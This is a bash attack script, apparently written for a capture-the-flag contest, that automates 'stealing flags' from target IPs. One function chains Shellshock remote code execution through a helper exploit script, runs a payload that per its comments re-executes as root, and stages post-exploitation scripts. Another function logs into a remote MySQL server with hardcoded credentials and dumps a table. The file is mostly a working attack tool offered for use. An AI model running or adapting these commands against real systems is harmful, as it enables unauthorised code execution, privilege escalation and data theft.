#!/bin/bash

# define the host to attack

PAUSE=6		# it is the shortest time to wait for connection to die
STAMP=`date +%H-%M`
SHAKEDIR=shakedown_flags

function usage {
	echo "Customize this script to automate attacks and steal flags"
	echo "./script.sh [automated attack]"
	echo " -S = shellshock staging"
	echo " -D = shakedown mysql remote dump"
	echo "example: `basename $0` -S <IP>"
}

function code_execute_via_shellshock {

	# grab the script
	./ctf_sploiting.py -m SR -t get_script -s exp.sh -i $1

	sleep 7	# try not to step on your own dick

	./ctf_sploiting.py -m SR -t custom -c "echo " -i $1
	# execute the script default ( it removes itself and reruns as root
	
	sleep $PAUSE

	./ctf_sploiting.py -m SR -t first_script -s exp.sh -i $1

	sleep $PAUSE

	# execute the POST script ( which is the same as exp.sh but with root )
	# download the tools as root
	# -g from the script downloads dump.sh & priv_escalator
	#./ctf_sploiting.py -m SR -t script_opt -a "-g" -i $HOST
	#./ctf_sploiting.py -m SR -t post_script -s post.sh -i $HOST
	
	#sleep $PAUSE

	./ctf_sploiting.py -m SR -t post_script -s cmnd.sh -i $1	
}

function break_into_shakedown {
	if [ ! -d $SHAKEDIR ]; then
		# if dir doesn't exist
		mkdir $SHAKEDIR
	fi
	
	cd $SHAKEDIR
	
	mysql -u shakedown -p5h4k3d0wn -h $1 -B -e  "use shakedown; select content from protections_news" > shakedown_$1_$STAMP.txt
}

case "$2" in
	-i) HOST=$3
		;;
	 *) echo "You must enter an IP with -i <IP>"
		exit 0
		;;
esac

case "$1" in
	-S) echo "using script to get code-ex via shellshock"
		code_execute_via_shellshock $HOST
		;;
	-D)	echo "Executing Shakedown Grabber"
		break_into_shakedown $HOST
		;;
	 *)	usage
		;;
esac


exit 0
